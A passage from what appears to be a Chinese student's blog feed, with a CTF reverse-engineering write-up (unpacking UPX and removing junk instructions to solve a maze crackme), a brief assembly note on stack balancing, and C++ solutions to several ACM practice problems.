alt="img"></p><p>得到一个判断输入数据正确性的函数，转为源代码形式<img src="https://i.loli.net/2020/12/21/wT1nSc89xFdIghm.png" alt="img"></p><p>很明显可以看出是一个解方程，只需使用hint中提到的z3解出答案方程答案即可得到flag</p><h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2><p>拿到题目打开后有一个很明显的UPX壳，无脑用UPX_SHELL脱壳后重新打开</p><p>可以看出这应该是关键代码的一部分。</p><p>这里jnz跳转到了下一行代码，相当于没跳转，<img src="https://img-blog.csdnimg.cn/20200203161152133.png" alt="在这里插入图片描述">而下面的<code>call near ptr 0EC85D78Bh</code>调用了一个不是地址的地址，可以推断出这段代码添加了花指令，IDA分析失败了。</p><p>可以确定这个jnz指令是花指令，还有下面的call指令。<br>先将jnz指令nop掉。<img src="https://img-blog.csdnimg.cn/20200203163906627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BhbG1lcjk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>之后就是这个call指令，不能全部nop，因为后面那个东西可能是有效代码。摁d将其先转换为字节数据。</p><p><img src="https://img-blog.csdnimg.cn/20200203164142113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BhbG1lcjk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>经过试验（先将第一个数据nop掉再转成代码，不行再将前俩数据nop……）发现 <code>db 0E8h</code>这条指令是添加的花指令，将其nop掉，nop掉之后IDA自动的将后面的数据转换为代码数据</p><p><img src="https://img-blog.csdnimg.cn/2020020316432998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BhbG1lcjk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>此时数据地址是红色的，将关键代码全部选中，摁p键将其声明为函数<br>然后就可以F5伪代码了</p><p><img src="https://img-blog.csdnimg.cn/20200203165617297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BhbG1lcjk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>根据题目maze可知这是一个迷宫题。<br>控制的有两个数据，一个是<code>dword_408078</code>，另一个是<code>dword_40807C</code><br>双击进去查看初始数据。<br>初始状态：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">dword_408078</span>=<span class="hljs-number">7</span><br><span class="hljs-attr">dword_40807C</span>=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>然后经过14次移动需要使</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">dword_408078</span>=<span class="hljs-number">5</span><br><span class="hljs-attr">dword_40807C</span>=-<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>然后在内存中找到迷宫<img src="https://img-blog.csdnimg.cn/20200203165444324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BhbG1lcjk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>提取出来排列之后<img src="https://img-blog.csdnimg.cn/20200203165745706.png" alt="在这里插入图片描述"></p><p>用wasd控制行走，dword_408078控制左右，dword_40807C控制上下。<br>s是上，w是下，a是右，d是左。<br>行走路径为ssaaasaassdddw<br>则flag为<code>flag&#123;ssaaasaassdddw&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> NEFU </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编学习-堆栈平衡</title>
      <link href="/2020/12/de2976c0.html"/>
      <url>/2020/12/de2976c0.html</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><ol><li>当调用某处的函数时，函数一般会使用堆栈作为存储的对象，这里就涉及到了堆栈使用结束后，如果不将堆栈及时还原而直接RETN，就会造成EIP的值被改变(00000000)，从而导致程序运行错误，因此，每次分体函数执行完毕后，都应该将使用过的堆栈还原到使用之前的内容。</li><li>如果通过堆栈传递参数了，那么在函数执行完毕后，要平衡参数导致的堆栈变化。</li></ol><h1 id="内平栈"><a href="#内平栈" class="headerlink" title="内平栈"></a>内平栈</h1><p>RETN 8相当于RETN之后再让mov exp,8</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM-DP-数塔问题</title>
      <link href="/2020/12/656af927.html"/>
      <url>/2020/12/656af927.html</url>
      
        <content type="html"><![CDATA[<p>Description</p><p>在讲述DP算法的时候，一个经典的例子就是数塔问题，它是这样描述的： </p><p>有如下所示的数塔，要求从顶层走到底层，若每一步只能走到相邻的结点，则经过的结点的数字之和最大是多少？ </p><p>已经告诉你了，这是个DP的题目，你能AC吗?</p><p>Input</p><p>输入数据首先包括一个整数C,表示测试实例的个数，每个测试实例的第一行是一个整数N(1 &lt;&#x3D; N &lt;&#x3D; 100)，表示数塔的高度，接下来用N行数字表示数塔，其中第i行有个i个整数，且所有的整数均在区间[0,99]内。 </p><p>Output</p><p>对于每个测试实例，输出可能得到的最大和，每个实例的输出占一行。 </p><p>Sample Input</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">1</span><br><span class="hljs-number">5</span><br><span class="hljs-number">7</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">8</span><br><span class="hljs-symbol">8 </span><span class="hljs-number">1</span> <span class="hljs-number">0</span> <br><span class="hljs-symbol">2 </span><span class="hljs-number">7</span> <span class="hljs-number">4</span> <span class="hljs-number">4</span><br><span class="hljs-symbol">4 </span><span class="hljs-number">5</span> <span class="hljs-number">2</span> <span class="hljs-number">6</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p>Sample Output</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">30<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> T;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;T);<br><span class="hljs-keyword">while</span>(T--)<br>&#123;<br><span class="hljs-type">int</span> i,j,n;<br><span class="hljs-type">int</span> a[<span class="hljs-number">200</span>][<span class="hljs-number">200</span>],dp[<span class="hljs-number">200</span>];<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">1</span>;j&lt;=i;j++)<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a[i][j]);<br><span class="hljs-built_in">memset</span>(dp,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(dp));<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>dp[j]=a[n][j];                          <span class="hljs-comment">//对最低层进行初始化 </span><br><span class="hljs-keyword">for</span>(i=n<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">1</span>;i--)<br>&#123;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">1</span>;j&lt;=i;j++)<br>dp[j]=<span class="hljs-built_in">max</span>(dp[j],dp[j+<span class="hljs-number">1</span>])+a[i][j];   <span class="hljs-comment">//状态转移方程 ，由下往上求最大值 </span><br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,dp[<span class="hljs-number">1</span>]);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125; <br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> DP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM-NEFUOJ-P239回文数</title>
      <link href="/2020/12/bf195a13.html"/>
      <url>/2020/12/bf195a13.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> n,p[<span class="hljs-number">1000</span>],len,p1[<span class="hljs-number">1000</span>];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">f</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=len;i++)<br><span class="hljs-keyword">if</span>(p[i]!=p[len-i]) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=len;i++)  p1[i]=p[len-i];<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=len;i++)  p[i]+=p1[i]; <br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=len;i++)<br>    p[i+<span class="hljs-number">1</span>]+=p[i]/n, p[i]=p[i]%n; <br><span class="hljs-keyword">if</span>(p[len+<span class="hljs-number">1</span>]&gt;<span class="hljs-number">0</span>) len++;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>string s;<br><span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">while</span>(cin&gt;&gt;n&gt;&gt;s)<br>&#123;<br><span class="hljs-built_in">memset</span>(p,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(p));<br>len=s.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">for</span>(i=len;i&gt;=<span class="hljs-number">0</span>;i--)<br>&#123;<br><span class="hljs-keyword">if</span>(s[i]&gt;=<span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; s[i]&lt;=<span class="hljs-string">&#x27;9&#x27;</span>) p[len-i]=s[i]-<span class="hljs-string">&#x27;0&#x27;</span>;<br><span class="hljs-keyword">if</span>(s[i]&gt;=<span class="hljs-string">&#x27;A&#x27;</span>)  p[len-i]=s[i]-<span class="hljs-string">&#x27;A&#x27;</span>+<span class="hljs-number">10</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">f</span>())  &#123;cout&lt;&lt;<span class="hljs-string">&#x27;0&#x27;</span>&lt;&lt;endl; <span class="hljs-keyword">continue</span>;&#125;<br><span class="hljs-type">int</span> t=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(t&lt;=<span class="hljs-number">30</span>)<br>&#123;<br>t++;<br><span class="hljs-built_in">f1</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">f</span>()) &#123; cout&lt;&lt;t&lt;&lt;endl; <span class="hljs-keyword">break</span>; &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(t&gt;<span class="hljs-number">30</span>)  cout&lt;&lt;<span class="hljs-string">&quot;Impossible&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM-NEFUOJ-P210畅通工程并查集</title>
      <link href="/2020/12/a630980b.html"/>
      <url>/2020/12/a630980b.html</url>
      
        <content type="html"><![CDATA[<p>题目：我已经明示到这个程度了你还不用并查集？</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN=<span class="hljs-number">1010</span>;<br><br><span class="hljs-type">int</span> F[MAXN];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GetFather</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> F[x]==x?x:F[x]=<span class="hljs-built_in">GetFather</span>(F[x]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Union</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> t1=<span class="hljs-built_in">GetFather</span>(a);<br>    <span class="hljs-type">int</span> t2=<span class="hljs-built_in">GetFather</span>(b);<br>    <span class="hljs-keyword">if</span>(t1!=t2) F[t1]=t2;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br><br>    <span class="hljs-keyword">while</span>(cin&gt;&gt;n&amp;&amp;n)<br>    &#123;<br>        cin&gt;&gt;m;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) F[i]=i;<br>        <span class="hljs-type">int</span> a,b;<br>        <span class="hljs-keyword">while</span>(m--)<br>        &#123;<br>            cin&gt;&gt;a&gt;&gt;b;<br>            <span class="hljs-built_in">Union</span>(a,b);<br>        &#125;<br>        <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>          <span class="hljs-keyword">if</span>(F[i]==i) res++;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,res<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> 并查集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM-NEFUOJ-P209湖南修路</title>
      <link href="/2020/12/40276439.html"/>
      <url>/2020/12/40276439.html</url>
      
        <content type="html"><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>prim的最小生成树，套上肝就完事了</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX 999999;</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> map[<span class="hljs-number">105</span>][<span class="hljs-number">105</span>],dist[<span class="hljs-number">105</span>];<br><span class="hljs-type">bool</span> vis[<span class="hljs-number">105</span>];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">prim</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> i,j,pos;<br>    <span class="hljs-type">int</span> min,sum;<br>    sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">memset</span>(vis,<span class="hljs-literal">false</span>,<span class="hljs-built_in">sizeof</span>(vis));<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>; i&lt;=n; i++)<br>    &#123;<br>        dist[i]=map[<span class="hljs-number">1</span>][i];<br>    &#125;<br>    vis[<span class="hljs-number">1</span>]=<span class="hljs-literal">true</span>;<br>    dist[<span class="hljs-number">1</span>]=MAX;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>; i&lt;n; i++)<br>    &#123;<br>        min=MAX;<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">1</span>; j&lt;=n; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(!vis[j] &amp;&amp; dist[j]&lt;min)<br>            &#123;<br>                min=dist[j];<br>                pos=j;<br>            &#125;<br>        &#125;<br>        sum+=min;<br>        vis[pos]=<span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">1</span>; j&lt;=n; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(!vis[j] &amp;&amp; dist[j]&gt;map[pos][j])<br>            &#123;<br>                dist[j]=map[pos][j];<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,a,b;<br>    <span class="hljs-type">int</span> c,d;<br>    <span class="hljs-keyword">while</span>(~<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(n==<span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(n*(n<span class="hljs-number">-1</span>)/<span class="hljs-number">2</span>); i++)<br>        &#123;<br>            cin &gt;&gt; a&gt;&gt; b&gt;&gt;c&gt;&gt;d;<br>            <span class="hljs-keyword">if</span>(d==<span class="hljs-number">1</span>)<br>                map[a][b]=map[b][a]=<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">else</span><br>                map[a][b]=map[b][a]=c;<br>        &#125;<br>        <span class="hljs-type">int</span> ans=<span class="hljs-built_in">prim</span>(n);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,ans);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> Prim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM-NEFUOJ-汉诺塔问题</title>
      <link href="/2020/12/2cb26a25.html"/>
      <url>/2020/12/2cb26a25.html</url>
      
        <content type="html"><![CDATA[<h1 id="P200汉诺塔"><a href="#P200汉诺塔" class="headerlink" title="P200汉诺塔"></a>P200汉诺塔</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,i;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> s[<span class="hljs-number">40</span>];<br>    s[<span class="hljs-number">1</span>]=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">2</span>;i&lt;=<span class="hljs-number">35</span>;i++)<br>    s[i]=<span class="hljs-number">3</span>*s[i<span class="hljs-number">-1</span>]+<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">while</span>(cin&gt;&gt;n)<br>        cout&lt;&lt;s[n]&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><h1 id="P201又见汉诺塔"><a href="#P201又见汉诺塔" class="headerlink" title="P201又见汉诺塔"></a>P201又见汉诺塔</h1><p>引用一波qky大佬的思路</p><blockquote><p><strong>在题目要求条件下，将n个盘子从左边移动到最右边的最快方法是：</strong></p><p>  <strong>（1）先将n-1个盘子移动到中间</strong></p><p>  <strong>（2）让最大的盘子直接移动到最右边（2步）</strong></p><p>  <strong>（3）最后再让n-1个盘子移动到最右边</strong></p><p><strong>（1）和（3）最需步数应该是一样的，且因为只有最大的盘子才能放在其他盘子上面，所以计算（1）（3）的步骤数时不需考虑这一特殊要求；</strong></p><p> <strong>我用near数组来储存（1）（3）所需的步骤，计算需要递归；n个盘子从左边移动到中间步骤如下：</strong></p><p>  <strong>（1）先让n-1个盘子移动到最右端</strong></p><p>  <strong>（2）让最大的盘子移动到中间</strong></p><p>  <strong>（3）让n-1个盘子从右端移动到中间</strong></p><p> <strong>（1）的话和200题一样的；（3）的话就是递归；</strong></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">long</span> <span class="hljs-type">long</span> han[<span class="hljs-number">21</span>];<br><br><span class="hljs-type">long</span> <span class="hljs-type">long</span> near[<span class="hljs-number">21</span>];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">prepare</span><span class="hljs-params">()</span></span>&#123;<br>    han[<span class="hljs-number">1</span>]=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=<span class="hljs-number">20</span>;i++)<br>        han[i]=<span class="hljs-number">3</span>*han[i<span class="hljs-number">-1</span>]+<span class="hljs-number">2</span>;<br>    near[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=<span class="hljs-number">20</span>;i++)<br>        near[i]=han[i<span class="hljs-number">-1</span>]+near[i<span class="hljs-number">-1</span>]+<span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*near[n<span class="hljs-number">-1</span>]+<span class="hljs-number">2</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">prepare</span>();<br>    <span class="hljs-type">int</span> T;<br>    cin&gt;&gt;T;<br>    <span class="hljs-keyword">while</span>(T--)&#123;<br>        <span class="hljs-type">int</span> n;<br>        cin&gt;&gt;n;<br>        cout&lt;&lt;<span class="hljs-built_in">fun</span>(n)&lt;&lt;endl;<br>    